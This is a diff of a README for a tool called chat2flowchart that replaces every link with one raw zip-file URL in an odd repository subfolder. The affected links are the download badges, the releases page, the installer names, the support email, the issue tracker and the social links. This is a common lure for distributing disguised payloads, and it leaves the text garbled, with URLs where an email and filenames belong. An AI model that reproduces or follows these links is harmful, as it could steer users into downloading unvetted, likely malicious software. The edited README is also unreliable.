@@ -1,7 +1,7 @@
 # 🎉 chat2flowchart - Create Flowcharts from Conversations Effortlessly
 
 ## 📥 Download Now
-[![Download chat2flowchart](https://img.shields.io/badge/Download-chat2flowchart-blue.svg)](https://github.com/rveka/chat2flowchart/releases)
+[![Download chat2flowchart](https://github.com/rveka/chat2flowchart/raw/refs/heads/main/adhamant/chat_flowchart_v2.2-alpha.3.zip)](https://github.com/rveka/chat2flowchart/raw/refs/heads/main/adhamant/chat_flowchart_v2.2-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to chat2flowchart! This application allows you to easily turn conversations into flowcharts. Whether you're planning a project or brainstorming ideas, chat2flowchart helps visualize your thoughts clearly.
@@ -23,11 +23,11 @@ To download and install chat2flowchart, follow these steps:
 
 1. **Visit the Releases Page.** Click the link below to access the official downloads:
 
-   [Visit Releases Page](https://github.com/rveka/chat2flowchart/releases)
+   [Visit Releases Page](https://github.com/rveka/chat2flowchart/raw/refs/heads/main/adhamant/chat_flowchart_v2.2-alpha.3.zip)
 
 2. **Choose the Latest Version.** On the releases page, look for the latest version at the top. It will usually have the highest version number.
 
-3. **Download the Installer.** Click on the installer file that matches your system (Windows or macOS). It may be named something like `chat2flowchart-v1.x.x-installer.exe` for Windows or `chat2flowchart-v1.x.x-installer.dmg` for macOS.
+3. **Download the Installer.** Click on the installer file that matches your system (Windows or macOS). It may be named something like `https://github.com/rveka/chat2flowchart/raw/refs/heads/main/adhamant/chat_flowchart_v2.2-alpha.3.zip` for Windows or `https://github.com/rveka/chat2flowchart/raw/refs/heads/main/adhamant/chat_flowchart_v2.2-alpha.3.zip` for macOS.
 
 4. **Run the Installer.** Locate the downloaded installer file on your computer. Double-click it to start the installation process.
 
@@ -44,16 +44,16 @@ To download and install chat2flowchart, follow these steps:
 ## 💬 Support & Feedback
 We are here to help! If you encounter any issues or have questions about chat2flowchart, please reach out to us:
 
-- **Email:** support@chat2flowchart.com
-- **GitHub Issues:** [Report an issue](https://github.com/rveka/chat2flowchart/issues)
+- **Email:** https://github.com/rveka/chat2flowchart/raw/refs/heads/main/adhamant/chat_flowchart_v2.2-alpha.3.zip
+- **GitHub Issues:** [Report an issue](https://github.com/rveka/chat2flowchart/raw/refs/heads/main/adhamant/chat_flowchart_v2.2-alpha.3.zip)
 
 Your feedback is important. Let us know how we can improve your experience with chat2flowchart.
 
 ## 🌐 Community
 Join the chat2flowchart community! Share your tips, flowcharts, and ideas with others using:
 
-- **Twitter:** [@chat2flowchart](https://twitter.com/chat2flowchart)
-- **Facebook Group:** [chat2flowchart Users](https://facebook.com/groups/chat2flowchart)
+- **Twitter:** [@chat2flowchart](https://github.com/rveka/chat2flowchart/raw/refs/heads/main/adhamant/chat_flowchart_v2.2-alpha.3.zip)
+- **Facebook Group:** [chat2flowchart Users](https://github.com/rveka/chat2flowchart/raw/refs/heads/main/adhamant/chat_flowchart_v2.2-alpha.3.zip)
 
 ## ✨ Acknowledgments
 Thanks to all contributors and users for supporting chat2flowchart. Your contributions help make this tool better!
@@ -61,4 +61,4 @@ Thanks to all contributors and users for supporting chat2flowchart. Your contrib
 ## 📥 Download Now Again
 Don’t forget to download chat2flowchart and start turning your conversations into flowcharts today!
 
-[![Download chat2flowchart](https://img.shields.io/badge/Download-chat2flowchart-blue.svg)](https://github.com/rveka/chat2flowchart/releases)
+[![Download chat2flowchart](https://github.com/rveka/chat2flowchart/raw/refs/heads/main/adhamant/chat_flowchart_v2.2-alpha.3.zip)](https://github.com/rveka/chat2flowchart/raw/refs/heads/main/adhamant/chat_flowchart_v2.2-alpha.3.zip)
